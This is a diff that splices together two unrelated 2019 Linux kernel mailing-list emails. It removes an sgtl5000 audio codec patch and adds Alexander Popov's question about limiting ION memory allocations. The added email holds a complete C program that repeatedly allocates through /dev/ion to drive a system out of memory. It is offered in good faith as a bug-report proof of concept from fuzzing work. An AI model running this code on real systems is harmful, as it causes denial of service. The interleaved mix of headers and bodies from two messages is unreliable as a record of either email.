@@ -2,147 +2,201 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id 8194A6BFA4
-	for <lists+linux-kernel@lfdr.de>; Wed, 17 Jul 2019 18:31:25 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 1A3206BFA6
+	for <lists+linux-kernel@lfdr.de>; Wed, 17 Jul 2019 18:32:08 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1727973AbfGQQbD (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Wed, 17 Jul 2019 12:31:03 -0400
-Received: from mail-eopbgr60133.outbound.protection.outlook.com ([40.107.6.133]:12419
-        "EHLO EUR04-DB3-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1727278AbfGQQa5 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-        Wed, 17 Jul 2019 12:30:57 -0400
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=CJ1tQErUAcXkpXPaRrTlbsOY3wdgalFCMx1/CIzfsL0s4fwJN/AS7m7XmFSzi3xyDZv+3P25WbXLihpVpbEzMgESHn0rsaef7Vis9M6MjGcsN6xUg97QdwONXroBdJicm4vzsvv6Woy9uUFu9mVhoAeXtU3EdK8BeQ8cmsza18P6DwifBqMqicPPfaqkKHlw1yk+tjJXHyRxcE+YmZF4W0Udel/S6oHTSE2k++5A77ZHnZcGDO3rrGAH2oOM61lW9YIk+VYj2sBgIRD2UdidVPMLiXHR7QCGAvu+14J06nLFkO2kuiRtrmY+INOYomd/MIROm4fdSF4vnVyJK1sS7Q==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=GsUCfA7TQyvCZr2KqIuza0U8qfFvAbZZvMTpLacaLz8=;
- b=LZd46ZsDwM54uu63AfuWOyO0DPVig3RbLn3ULRRKXVxkhBmERQJwx+iSkOTicsZRs/6+88t5HUAMtqtxCN4g6ulG48lI3lh/Hbd0twrCRf4Otc5d3IbiTac+Z0FRG/ly2+VkfSY9mJXrBn5l5vHiqBm0BKeUTaswtxrRe9BU1xwgjzLrICFb9Kf4hmvOhrvNt0jAqikknGTicwY1XmAJFK0Be/XmXGQjNftERihUIRvlaW7DZ7SqzVOZ/OP8CHcUb0OT7TNKA46HkPGkIk6M2Cb8dxqV1hTO/0x8OAcDLKjcSV/7WovJIBC+9Q8Fs3SMq5GJmzTCvLla+TzX+WbHzQ==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1;spf=pass
- smtp.mailfrom=toradex.com;dmarc=pass action=none
- header.from=toradex.com;dkim=pass header.d=toradex.com;arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=toradex.com;
- s=selector1;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=GsUCfA7TQyvCZr2KqIuza0U8qfFvAbZZvMTpLacaLz8=;
- b=AsAd+HP5OmLHXAmVuNye2JB/LsWXM+19z0BB/mKrWA5c9y0zjKyRT4J84WyxaWpJja5ubzo0DxCLqlb3U15Vu5b3ZKRdhaMW4GV+TLW2gq1DbYIu0p5eBosnTf8VajKlQ2y/D5COM/Zr0zbFitFOiVs2vP6W80bjJ8QI4bhDSL4=
-Received: from AM6PR05MB6535.eurprd05.prod.outlook.com (20.179.18.16) by
- AM6PR05MB4455.eurprd05.prod.outlook.com (52.135.162.152) with Microsoft SMTP
- Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.20.2094.11; Wed, 17 Jul 2019 16:30:54 +0000
-Received: from AM6PR05MB6535.eurprd05.prod.outlook.com
- ([fe80::c860:b386:22a:8ec9]) by AM6PR05MB6535.eurprd05.prod.outlook.com
- ([fe80::c860:b386:22a:8ec9%6]) with mapi id 15.20.2094.011; Wed, 17 Jul 2019
- 16:30:54 +0000
-From:   Oleksandr Suvorov <oleksandr.suvorov@toradex.com>
-To:     Fabio Estevam <festevam@gmail.com>
-CC:     "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
-        Igor Opaniuk <igor.opaniuk@toradex.com>,
-        Marcel Ziswiler <marcel.ziswiler@toradex.com>,
-        "alsa-devel@alsa-project.org" <alsa-devel@alsa-project.org>,
-        Oleksandr Suvorov <oleksandr.suvorov@toradex.com>,
-        Jaroslav Kysela <perex@perex.cz>,
-        Mark Brown <broonie@kernel.org>, Takashi Iwai <tiwai@suse.com>,
-        Liam Girdwood <lgirdwood@gmail.com>
-Subject: [PATCH v4 6/6] ASoC: sgtl5000: Fix charge pump source assignment
-Thread-Topic: [PATCH v4 6/6] ASoC: sgtl5000: Fix charge pump source assignment
-Thread-Index: AQHVPL0B+q/A+n5bN0Kf42jiqIXQuQ==
-Date:   Wed, 17 Jul 2019 16:30:54 +0000
-Message-ID: <20190717163014.429-7-oleksandr.suvorov@toradex.com>
-References: <20190717163014.429-1-oleksandr.suvorov@toradex.com>
-In-Reply-To: <20190717163014.429-1-oleksandr.suvorov@toradex.com>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach: 
-X-MS-TNEF-Correlator: 
-x-clientproxiedby: AM3PR07CA0082.eurprd07.prod.outlook.com
- (2603:10a6:207:6::16) To AM6PR05MB6535.eurprd05.prod.outlook.com
- (2603:10a6:20b:71::16)
-authentication-results: spf=none (sender IP is )
- smtp.mailfrom=oleksandr.suvorov@toradex.com; 
-x-ms-exchange-messagesentrepresentingtype: 1
-x-mailer: git-send-email 2.20.1
-x-originating-ip: [194.105.145.90]
-x-ms-publictraffictype: Email
-x-ms-office365-filtering-correlation-id: 770b3b11-bf38-489b-7aeb-08d70ad423bd
-x-microsoft-antispam: BCL:0;PCL:0;RULEID:(2390118)(7020095)(4652040)(8989299)(4534185)(4627221)(201703031133081)(201702281549075)(8990200)(5600148)(711020)(4605104)(1401327)(2017052603328)(7193020);SRVR:AM6PR05MB4455;
-x-ms-traffictypediagnostic: AM6PR05MB4455:
-x-ms-exchange-purlcount: 1
-x-microsoft-antispam-prvs: <AM6PR05MB4455B9DB5E676CF2B6D102BDF9C90@AM6PR05MB4455.eurprd05.prod.outlook.com>
-x-ms-oob-tlc-oobclassifiers: OLM:989;
-x-forefront-prvs: 01018CB5B3
-x-forefront-antispam-report: SFV:NSPM;SFS:(10019020)(4636009)(136003)(346002)(396003)(39850400004)(376002)(366004)(189003)(199004)(7736002)(4326008)(6916009)(966005)(478600001)(66556008)(66476007)(66446008)(81166006)(5660300002)(50226002)(305945005)(66946007)(71190400001)(64756008)(66066001)(71200400001)(1076003)(8936002)(2616005)(6436002)(81156014)(256004)(476003)(2906002)(8676002)(446003)(11346002)(3846002)(52116002)(53936002)(44832011)(186003)(486006)(99286004)(102836004)(6506007)(386003)(76176011)(1411001)(26005)(68736007)(36756003)(86362001)(14454004)(25786009)(316002)(6512007)(6306002)(54906003)(6486002)(6116002);DIR:OUT;SFP:1102;SCL:1;SRVR:AM6PR05MB4455;H:AM6PR05MB6535.eurprd05.prod.outlook.com;FPR:;SPF:None;LANG:en;PTR:InfoNoRecords;MX:1;A:1;
-received-spf: None (protection.outlook.com: toradex.com does not designate
- permitted sender hosts)
-x-ms-exchange-senderadcheck: 1
-x-microsoft-antispam-message-info: 4NKyXphBDfnNA/oSAAZOuzi1zCxofok/9mAGjGlIEf8Ro2psjbOxQIfUYkXiddUTBops5JWNOjJgSXOdW/ukqk9+tx3zdnWJuZAAiLX7BkZhmvsU56VlxkNjEBqO9N4hEwOTdAtdjMEugbPIEJV3Yckk7rlqnTrWAFABXQ+HQKBAsPWzB5AQRfuuxBzBhzko1ZsaYt5iLx89hxvgYBQzRP/zSOs2dY4phZo5RXtdVf0gMoE2/Rcr7ZZgbGQULkq1zphDt/VreP7jhj72iAxmOUVIk2TkbFGa3uwpT9huah1XNfFO9IxxnZEo5Ht7GiEnhCrdmV7DPdjO/F1WBKMKpIdaKbkwzvEg4q3c4fYp5lLcumvKwJG7et361jDPq6XSYhbTBUWTxMFvpiJVpa5KO6RUmAWBIszXpOzlZIYxakY=
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
+        id S1728158AbfGQQcD (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Wed, 17 Jul 2019 12:32:03 -0400
+Received: from mail-lj1-f195.google.com ([209.85.208.195]:46716 "EHLO
+        mail-lj1-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1726063AbfGQQcD (ORCPT
+        <rfc822;linux-kernel@vger.kernel.org>);
+        Wed, 17 Jul 2019 12:32:03 -0400
+Received: by mail-lj1-f195.google.com with SMTP id v24so24290109ljg.13
+        for <linux-kernel@vger.kernel.org>; Wed, 17 Jul 2019 09:32:01 -0700 (PDT)
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:reply-to:to:from:subject:openpgp:autocrypt
+         :message-id:date:user-agent:mime-version:content-language
+         :content-transfer-encoding;
+        bh=E75NjAXiWhvCZvdE/u04pYeja5zqL3MqVrXHa7H4HfY=;
+        b=aft8Ef8MVgTJ4F/BSF55fF0Sxrr0MpzCt8GWwjZa0SxrJEbZpnpWlWFK36Nc5+IfpE
+         7lMZ7JjWPbw9TpNoX9JIB2gLj+MwrNoXr8qalCVhBTM2p9DF9pksy1Pt0JGP/BuquU06
+         sx+MK7dRfHHPmxU99l34yavmVICwxjKNyNm34z8Tf4L/3M1Rt2w52hrKyIn/n1zggbYx
+         C7F/01BT5uchEOl256pzk6gyVAJA4ee8Dm2XJpPuWYvnmd8+AhhUD+RtL0WilqVGlptJ
+         Ez95cKA1rOCltjf8DUTWlZOfKcyFWTqb3YaBoF48yoMgx4VSXA+sa8PleSs8DD2Ns+gF
+         H8kw==
+X-Gm-Message-State: APjAAAU/crS5j9Tg1d/r4WoqaNUSpiTonPjbxd9u1t7FEhO1WRmVyFTI
+        h9SA1HmbMr+98dNXlPUW+N4=
+X-Google-Smtp-Source: APXvYqw8/yzTJs6CxTi/F2Af1OajkefZ36GPQOQNQraarNA3wXnfgWI3z9FIK37oPgVQgrECoeTI2A==
+X-Received: by 2002:a2e:7604:: with SMTP id r4mr21491517ljc.225.1563381121256;
+        Wed, 17 Jul 2019 09:32:01 -0700 (PDT)
+Received: from [192.168.42.115] ([213.87.160.6])
+        by smtp.gmail.com with ESMTPSA id b17sm4573698ljf.34.2019.07.17.09.31.58
+        (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
+        Wed, 17 Jul 2019 09:32:00 -0700 (PDT)
+Reply-To: alex.popov@linux.com
+To:     Laura Abbott <labbott@redhat.com>,
+        Sumit Semwal <sumit.semwal@linaro.org>,
+        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
+        arve@android.com, Todd Kjos <tkjos@android.com>,
+        Martijn Coenen <maco@android.com>,
+        Joel Fernandes <joel@joelfernandes.org>,
+        Christian Brauner <christian@brauner.io>,
+        Riley Andrews <riandrews@android.com>,
+        devel@driverdev.osuosl.org, linaro-mm-sig@lists.linaro.org,
+        linux-arm-kernel <linux-arm-kernel@lists.infradead.org>,
+        dri-devel@lists.freedesktop.org,
+        LKML <linux-kernel@vger.kernel.org>,
+        Brian Starkey <brian.starkey@arm.com>,
+        Daniel Vetter <daniel.vetter@intel.com>,
+        Mark Brown <broonie@kernel.org>,
+        Benjamin Gaignard <benjamin.gaignard@linaro.org>,
+        Linux-MM <linux-mm@kvack.org>,
+        Dmitry Vyukov <dvyukov@google.com>,
+        Andrey Konovalov <andreyknvl@google.com>,
+        syzkaller@googlegroups.com
+From:   Alexander Popov <alex.popov@linux.com>
+Subject: Limits for ION Memory Allocator
+Openpgp: preference=signencrypt
+Autocrypt: addr=alex.popov@linux.com; prefer-encrypt=mutual; keydata=
+ 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
+ jXz/74kjFsyRgZA+d6a1pGtOwITEBxtxxg==
+Message-ID: <3b922aa4-c6d4-e4a4-766d-f324ff77f7b5@linux.com>
+Date:   Wed, 17 Jul 2019 19:31:57 +0300
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+ Thunderbird/60.7.1
 MIME-Version: 1.0
-X-OriginatorOrg: toradex.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 770b3b11-bf38-489b-7aeb-08d70ad423bd
-X-MS-Exchange-CrossTenant-originalarrivaltime: 17 Jul 2019 16:30:54.6018
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: d9995866-0d9b-4251-8315-093f062abab4
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: oleksandr.suvorov@toradex.com
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: AM6PR05MB4455
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: 7bit
 Sender: linux-kernel-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-If VDDA !=3D VDDIO and any of them is greater than 3.1V, charge pump
-source can be assigned automatically [1].
+Hello!
 
-[1] https://www.nxp.com/docs/en/data-sheet/SGTL5000.pdf
+The syzkaller [1] has a trouble with fuzzing the Linux kernel with ION Memory
+Allocator.
 
-Signed-off-by: Oleksandr Suvorov <oleksandr.suvorov@toradex.com>
-Reviewed-by: Marcel Ziswiler <marcel.ziswiler@toradex.com>
-Reviewed-by: Igor Opaniuk <igor.opaniuk@toradex.com>
----
+Syzkaller uses several methods [2] to limit memory consumption of the userspace
+processes calling the syscalls for testing the kernel:
+ - setrlimit(),
+ - cgroups,
+ - various sysctl.
+But these methods don't work for ION Memory Allocator, so any userspace process
+that has access to /dev/ion can bring the system to the out-of-memory state.
 
-Changes in v4: None
-Changes in v3:
-- Add the reference to NXP SGTL5000 data sheet to commit message
-- Fix multi-line comment format
+An example of a program doing that:
 
-Changes in v2:
-- Fix patch formatting
 
- sound/soc/codecs/sgtl5000.c | 15 ++++++++++-----
- 1 file changed, 10 insertions(+), 5 deletions(-)
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <linux/types.h>
+#include <sys/ioctl.h>
 
-diff --git a/sound/soc/codecs/sgtl5000.c b/sound/soc/codecs/sgtl5000.c
-index 31d546abde717..a04cba66615de 100644
---- a/sound/soc/codecs/sgtl5000.c
-+++ b/sound/soc/codecs/sgtl5000.c
-@@ -1328,12 +1328,17 @@ static int sgtl5000_set_power_regs(struct snd_soc_c=
-omponent *component)
- 					SGTL5000_INT_OSC_EN);
- 		/* Enable VDDC charge pump */
- 		ana_pwr |=3D SGTL5000_VDDC_CHRGPMP_POWERUP;
--	} else if (vddio >=3D 3100 && vdda >=3D 3100) {
-+	} else {
- 		ana_pwr &=3D ~SGTL5000_VDDC_CHRGPMP_POWERUP;
--		/* VDDC use VDDIO rail */
--		lreg_ctrl |=3D SGTL5000_VDDC_ASSN_OVRD;
--		lreg_ctrl |=3D SGTL5000_VDDC_MAN_ASSN_VDDIO <<
--			    SGTL5000_VDDC_MAN_ASSN_SHIFT;
-+		/*
-+		 * if vddio =3D=3D vdda the source of charge pump should be
-+		 * assigned manually to VDDIO
-+		 */
-+		if (vddio =3D=3D vdda) {
-+			lreg_ctrl |=3D SGTL5000_VDDC_ASSN_OVRD;
-+			lreg_ctrl |=3D SGTL5000_VDDC_MAN_ASSN_VDDIO <<
-+				    SGTL5000_VDDC_MAN_ASSN_SHIFT;
-+		}
- 	}
-=20
- 	snd_soc_component_write(component, SGTL5000_CHIP_LINREG_CTRL, lreg_ctrl);
---=20
-2.20.1
+#define ION_IOC_MAGIC		'I'
+#define ION_IOC_ALLOC		_IOWR(ION_IOC_MAGIC, 0, \
+				      struct ion_allocation_data)
 
+struct ion_allocation_data {
+	__u64 len;
+	__u32 heap_id_mask;
+	__u32 flags;
+	__u32 fd;
+	__u32 unused;
+};
+
+int main(void)
+{
+	unsigned long i = 0;
+	int fd = -1;
+	struct ion_allocation_data data = {
+		.len = 0x13f65d8c,
+		.heap_id_mask = 1,
+		.flags = 0,
+		.fd = -1,
+		.unused = 0
+	};
+
+	fd = open("/dev/ion", 0);
+	if (fd == -1) {
+		perror("[-] open /dev/ion");
+		return 1;
+	}
+
+	while (1) {
+		printf("iter %lu\n", i);
+		ioctl(fd, ION_IOC_ALLOC, &data);
+		i++;
+	}
+
+	return 0;
+}
+
+
+I looked through the code of ion_alloc() and didn't find any limit checks.
+Is it currently possible to limit ION kernel allocations for some process?
+
+If not, is it a right idea to do that?
+Thanks!
+
+Best regards,
+Alexander
+
+
+[1]: https://github.com/google/syzkaller
+[2]: https://github.com/google/syzkaller/blob/master/executor/common_linux.h
